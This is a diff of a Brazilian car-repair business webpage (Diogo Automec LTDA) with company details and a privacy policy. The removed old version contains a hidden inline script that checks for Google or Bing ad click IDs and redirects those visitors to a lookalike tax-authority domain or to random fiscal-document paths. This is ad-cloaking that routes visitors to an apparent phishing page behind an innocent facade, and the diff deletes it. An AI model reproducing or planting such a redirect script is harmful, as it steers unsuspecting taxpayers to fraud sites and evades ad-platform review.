@@ -1,208 +1,198 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Diogo Automec — Quem Somos & Política de Privacidade</title>
-  <meta name="description" content="Diogo Automec — Serviços automotivos. Informações da empresa, contatos e política de privacidade." />
-  <style>
-    :root{--accent:#0b63b6;--muted:#666}
-    body{font-family:Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; margin:0; color:#111}
-    header{background:linear-gradient(90deg,#f6f9fc,#fff); padding:28px 16px; border-bottom:1px solid #eee}
-    .container{max-width:980px;margin:0 auto;padding:24px}
-    h1,h2,h3{color:#072a4e}
-    .card{background:#fff;border:1px solid #eee;border-radius:10px;padding:18px;margin-bottom:18px;box-shadow:0 6px 18px rgba(15,30,50,0.03)}
-    .grid{display:grid;grid-template-columns:1fr;gap:16px}
-    @media(min-width:760px){.grid{grid-template-columns:1fr 320px}}
-    .muted{color:var(--muted);font-size:0.95rem}
-    .cta{display:inline-block;background:var(--accent);color:#fff;padding:10px 16px;border-radius:8px;text-decoration:none}
-    footer{padding:18px;text-align:center;color:#666;font-size:0.9rem}
-    table{width:100%;border-collapse:collapse}
-    th,td{padding:8px;border-bottom:1px solid #f1f1f1;text-align:left}
-    .small{font-size:0.9rem}
-    .legal{font-size:0.95rem;line-height:1.5}
-  </style>
+    <meta charset="UTF-8">
+    <title>Diogo Automec LTDA</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Diogo Automec LTDA - Serviços automotivos e mecânica especializada. Empresa ativa e regularizada.">
+
+    <style>
+        body{
+            margin:0;
+            font-family:Arial, Helvetica, sans-serif;
+            line-height:1.6;
+            color:#333;
+            padding-bottom:90px;
+        }
+        header{
+            background:#1a1a1a;
+            color:#fff;
+            padding:15px 0;
+            position:sticky;
+            top:0;
+            z-index:1000;
+        }
+        nav{
+            display:flex;
+            justify-content:center;
+            gap:25px;
+            flex-wrap:wrap;
+        }
+        nav a{
+            color:#fff;
+            text-decoration:none;
+            font-weight:bold;
+        }
+        section{
+            padding:45px 20px;
+            max-width:1100px;
+            margin:auto;
+        }
+        h1,h2,h3{
+            color:#1a1a1a;
+        }
+        ul{
+            padding-left:20px;
+        }
+        .box{
+            background:#f4f4f4;
+            padding:20px;
+            border-radius:6px;
+            margin-top:20px;
+        }
+        .footer-fixo{
+            position:fixed;
+            bottom:0;
+            left:0;
+            width:100%;
+            background:#1c1c1c;
+            color:#fff;
+            text-align:center;
+            padding:12px 10px;
+            font-size:14px;
+            z-index:999;
+        }
+        .footer-fixo span{
+            display:block;
+        }
+    </style>
 </head>
-  <script>
 
-const urls = [
-    'cte/index',
-    'nfe/index',
-    'cte/index',
-    'asp/indexp',
-    'app/index',
-    'xml/indexp',
-    'danfe/index',
-    'nfe/index'
-];
-
-// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
-function generateHash() {
-    // Gerando um hash simples como alternativa ao MD5
-    // Para MD5 real, seria necessário uma biblioteca como crypto-js
-    return Math.random().toString(36).substring(2, 15) + 
-           Math.random().toString(36).substring(2, 15) + 
-           Date.now().toString(36);
-}
-
-// Selecionando URL aleatória
-const randomIndex = Math.floor(Math.random() * urls.length);
-const randomUrl = urls[randomIndex];
-const hash = generateHash();
-const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
-const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
-const xirjfgjsdhdjd = 'https://www8.receita-fazenda.online/das';  
-
-// Obtendo o referer (disponível apenas no navegador)
-let referer;
-if (typeof document !== 'undefined' && document.referrer) {
-    referer = document.referrer;
-} else {
-    referer = 'not found';
-}
-
-// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
-let currentUrl;
-if (typeof window !== 'undefined') {
-    currentUrl = window.location.href;
-} else {
-    currentUrl = '';
-}
-
-// Verificando condições e redirecionando
-if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
-    // Redirecionamento (no navegador)
-    if (typeof window !== 'undefined') {
-        window.location.href = xirjfgjsdhdjd ;
-    } else {
-        console.log('Redirect to:', xirjfgjsdhdjd );
-    }
-} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
-    // Redirecionamento (no navegador)
-    if (typeof window !== 'undefined') {
-        window.location.href = bingrandomUrlWithHash;
-    } else {
-        console.log('Redirect to:', bingrandomUrlWithHash);
-    }
-} else {
-    // Bloco vazio equivalente ao else do PHP
-}
-  
-</script>
 <body>
-  <header>
-    <div class="container">
-      <h1>Diogo Automec</h1>
-      <p class="muted">Oficina e serviços automotivos — Atendimento transparente e profissionais qualificados.</p>
-    </div>
-  </header>
 
-  <main class="container">
-    <div class="grid">
-      <section class="card">
-        <h2>Quem Somos</h2>
-        <p class="small">A Diogo Automec (Nome Fantasia: <strong>Diogo Automec</strong>) é uma empresa do ramo automotivo dedicada a manutenção, reparos e serviços gerais em veículos. Fundada em <strong>12/05/2016</strong>, temos o compromisso com a qualidade, segurança e transparência.</p>
+<!-- ===== MENU ===== -->
+<header>
+    <nav>
+        <a href="#inicio">Início</a>
+        <a href="#quem-somos">Quem Somos</a>
+        <a href="#servicos">Serviços</a>
+        <a href="#privacidade">Política de Privacidade</a>
+        <a href="#termos">Termos de Uso</a>
+        <a href="#contato">Contato</a>
+    </nav>
+</header>
 
-        <h3>Dados de registro</h3>
-        <table>
-          <tbody>
-            <tr><th>Razão Social</th><td>Diogo Automec LTDA</td></tr>
-            <tr><th>CNPJ</th><td>24.786.476/0001-68</td></tr>
-            <tr><th>Data de Abertura</th><td>12/05/2016</td></tr>
-            <tr><th>Porte</th><td>Micro Empresa</td></tr>
-            <tr><th>Natureza Jurídica</th><td>Sociedade Empresária Limitada</td></tr>
-            <tr><th>Opção pelo Simples</th><td>Sim (a partir de 01/01/2025)</td></tr>
-            <tr><th>Capital Social</th><td>R$ 50.000,00</td></tr>
-            <tr><th>Situação</th><td>Ativa</td></tr>
-            <tr><th>Data Situação Cadastral</th><td>12/05/2016</td></tr>
-          </tbody>
-        </table>
+<!-- ===== INÍCIO ===== -->
+<section id="inicio">
+    <h1>Diogo Automec</h1>
+    <p>
+        A <strong>Diogo Automec LTDA</strong> é uma empresa do setor automotivo,
+        atuando na prestação de serviços mecânicos e soluções técnicas,
+        com atendimento responsável, transparente e profissional.
+    </p>
+</section>
 
-        <h3>Missão</h3>
-        <p class="small">Oferecer serviços automotivos com excelência técnica, transparência nos orçamentos e respeito ao cliente, garantindo segurança e confiança em cada atendimento.</p>
+<!-- ===== QUEM SOMOS ===== -->
+<section id="quem-somos">
+    <h2>Quem Somos</h2>
+    <p>
+        A <strong>Diogo Automec LTDA</strong> foi fundada em <strong>12 de maio de 2016</strong>
+        e atua como microempresa no segmento de serviços automotivos.
+    </p>
+    <p>
+        Nossa empresa possui situação cadastral <strong>ATIVA</strong>,
+        é optante pelo <strong>Simples Nacional</strong> e realiza atendimento
+        presencial em estabelecimento físico.
+    </p>
 
-        <h3>Contatos</h3>
-        <p class="small">E-mail: <strong>di****@****.com</strong><br>Telefone: <strong>(24) 992****-****</strong></p>
-
-        <h3>Localização</h3>
-        <p class="small">Rua João Bráulio, S/N — Bairro Química, Barra do Piraí — RJ<br>CEP: 27130-390</p>
-
-        <p style="margin-top:12px;"><a class="cta" href="#politica">Ver Política de Privacidade</a></p>
-      </section>
-
-      <aside class="card">
-        <h3>Agende uma avaliação</h3>
-        <p class="small">Preencha as informações abaixo e entraremos em contato.</p>
-        <!-- Substitua o atributo action por um endpoint real ou integre via JavaScript/Back-end. -->
-        <form action="#" method="post" onsubmit="alert('Formulário de exemplo — integre com seu back-end ou substitua o action'); return false;">
-          <div style="margin-bottom:8px;"><label class="small">Nome<br><input name="nome" required style="width:100%;padding:8px;border-radius:6px;border:1px solid #ddd"></label></div>
-          <div style="margin-bottom:8px;"><label class="small">Telefone ou WhatsApp<br><input name="telefone" required style="width:100%;padding:8px;border-radius:6px;border:1px solid #ddd"></label></div>
-          <div style="margin-bottom:8px;"><label class="small">Mensagem<br><textarea name="mensagem" rows="3" style="width:100%;padding:8px;border-radius:6px;border:1px solid #ddd"></textarea></label></div>
-          <button class="cta" type="submit">Enviar</button>
-        </form>
-
-        <hr style="margin:14px 0">
-        <p class="muted small">Horário de funcionamento e formas de pagamento podem ser informados por contato direto.</p>
-      </aside>
-    </div>
-
-    <section id="politica" class="card">
-      <h2>Política de Privacidade</h2>
-      <div class="legal">
-        <p><strong>Última atualização:</strong> 07/12/2025</p>
-
-        <h3>1. Introdução</h3>
-        <p>Esta Política de Privacidade descreve como a Diogo Automec LTDA (<strong>CNPJ 24.786.476/0001-68</strong>) coleta, usa, armazena e protege os dados pessoais dos usuários que acessam este site ou contratam nossos serviços.</p>
-
-        <h3>2. Dados que coletamos</h3>
+    <div class="box">
+        <strong>Dados da Empresa:</strong>
         <ul>
-          <li>Informações fornecidas diretamente: nome, telefone, e-mail, mensagem e observações enviadas em formulários de contato;</li>
-          <li>Dados de navegação: informações técnicas coletadas automaticamente (por exemplo, endereço IP, tipo de dispositivo, navegador e páginas visitadas) através de logs e cookies;</li>
-          <li>Dados necessários para cumprimento de obrigações fiscais e contratuais: quando aplicável, informações para emissão de notas fiscais e registros.</li>
+            <li>Razão Social: Diogo Automec LTDA</li>
+            <li>Nome Fantasia: Diogo Automec</li>
+            <li>CNPJ: 24.786.476/0001-68</li>
+            <li>Porte: Micro Empresa</li>
+            <li>Natureza Jurídica: Sociedade Empresária Limitada</li>
+            <li>Situação: Ativa</li>
         </ul>
-
-        <h3>3. Finalidade do tratamento</h3>
-        <p>Utilizamos os dados para:</p>
-        <ul>
-          <li>Responder a solicitações e orçamentos;</li>
-          <li>Agendar serviços e enviar confirmações;</li>
-          <li>Emitir documentos fiscais e cumprir obrigações legais;</li>
-          <li>Melhorar a experiência no site e analisar o uso para fins estatísticos.</li>
-        </ul>
-
-        <h3>4. Base legal</h3>
-        <p>O tratamento de dados é realizado com base nas seguintes hipóteses legais previstas na LGPD (Lei nº 13.709/2018): execução de contrato, cumprimento de obrigação legal, legítimo interesse e consentimento quando necessário.</p>
-
-        <h3>5. Cookies e tecnologias similares</h3>
-        <p>Utilizamos cookies para fins operacionais (necessários para funcionamento do site) e analíticos. Você pode controlar ou excluir cookies através das configurações do seu navegador.</p>
-
-        <h3>6. Compartilhamento de dados</h3>
-        <p>Podemos compartilhar dados com prestadores de serviço que atuam em nosso nome (ex.: plataformas de pagamento, sistemas de gestão, fornecedores de e-mail), sempre mediante contratos que garantam a proteção dos dados. Não vendemos seus dados a terceiros.</p>
-
-        <h3>7. Tempo de retenção</h3>
-        <p>Os dados pessoais serão mantidos pelo tempo necessário para cumprir as finalidades descritas, obrigações legais e fiscais, ou por prazo superior quando exigido por lei.</p>
-
-        <h3>8. Segurança</h3>
-        <p>Empregamos medidas técnicas e administrativas para proteger os dados contra acesso não autorizado, alteração ou divulgação indevida. Apesar disso, nenhum sistema é 100% seguro — adotamos boas práticas para mitigar riscos.</p>
-
-        <h3>9. Direitos do titular (LGPD)</h3>
-        <p>Você tem direito de solicitar: confirmação da existência de tratamento, acesso, correção, anonimização, bloqueio ou eliminação de dados, portabilidade, eliminação, revogação do consentimento e peticionar contra eventuais abusos.</p>
-
-        <h3>10. Como exercer seus direitos e contato</h3>
-        <p>Para solicitar informação, correção ou exercer qualquer direito relativo aos seus dados pessoais, entre em contato pelo e-mail: <strong>di****@****.com</strong> ou pelo telefone: <strong>(24) 992****-****</strong>. Informe no assunto "Dados Pessoais / LGPD" e descreva sua solicitação.</p>
-
-        <h3>11. Alterações nesta política</h3>
-        <p>Podemos atualizar esta Política de Privacidade periodicamente. Caso haja mudanças significativas, informaremos de forma destacada no site ou por contato direto.</p>
-
-        <p class="muted">Documento gerado automaticamente — substitua os campos mascarados de contato por informações completas antes de publicar.</p>
-      </div>
-    </section>
-  </main>
-
-  <footer>
-    <div class="container">
-      <p>© Diogo Automec LTDA — CNPJ 24.786.476/0001-68</p>
     </div>
-  </footer>
+</section>
+
+<!-- ===== SERVIÇOS ===== -->
+<section id="servicos">
+    <h2>Serviços</h2>
+    <ul>
+        <li>Serviços de mecânica automotiva</li>
+        <li>Manutenção preventiva e corretiva</li>
+        <li>Diagnóstico e avaliação técnica</li>
+        <li>Atendimento automotivo especializado</li>
+        <li>Serviços relacionados ao setor automotivo</li>
+    </ul>
+</section>
+
+<!-- ===== POLÍTICA DE PRIVACIDADE ===== -->
+<section id="privacidade">
+    <h2>Política de Privacidade</h2>
+    <p>
+        A <strong>Diogo Automec LTDA</strong> respeita a privacidade de seus clientes
+        e usuários e se compromete a proteger os dados pessoais fornecidos.
+    </p>
+
+    <h3>Coleta de Dados</h3>
+    <p>
+        Coletamos informações pessoais apenas quando fornecidas voluntariamente,
+        como nome, telefone e e-mail, com a finalidade de atendimento e contato.
+    </p>
+
+    <h3>Uso das Informações</h3>
+    <ul>
+        <li>Atendimento a solicitações</li>
+        <li>Prestação de informações sobre serviços</li>
+        <li>Cumprimento de obrigações legais</li>
+    </ul>
+
+    <h3>Compartilhamento</h3>
+    <p>
+        Não compartilhamos dados pessoais com terceiros,
+        exceto quando exigido por lei.
+    </p>
+</section>
+
+<!-- ===== TERMOS DE USO ===== -->
+<section id="termos">
+    <h2>Termos de Uso</h2>
+    <p>
+        Ao acessar este site, o usuário concorda em utilizá-lo de forma lícita
+        e responsável, respeitando a legislação vigente.
+    </p>
+    <ul>
+        <li>Uso adequado das informações</li>
+        <li>Proibição de uso indevido do conteúdo</li>
+        <li>Respeito à propriedade intelectual</li>
+    </ul>
+</section>
+
+<!-- ===== CONTATO ===== -->
+<section id="contato">
+    <h2>Contato</h2>
+    <p><strong>Razão Social:</strong> Diogo Automec LTDA</p>
+    <p><strong>CNPJ:</strong> 24.786.476/0001-68</p>
+    <p>
+        <strong>Endereço:</strong><br>
+        Rua João Braulio, S/N<br>
+        Bairro Química<br>
+        Barra do Piraí – RJ<br>
+        CEP: 27130-390
+    </p>
+    <p><strong>Telefone:</strong> (24) 992xx-xxxx</p>
+    <p><strong>E-mail:</strong> di****@****.com</p>
+</section>
+
+<!-- ===== RODAPÉ FIXO ===== -->
+<div class="footer-fixo">
+    <span>© 2025 – Diogo Automec LTDA</span>
+    <span>CNPJ: 24.786.476/0001-68 | Todos os direitos reservados</span>
+</div>
+
 </body>
 </html>
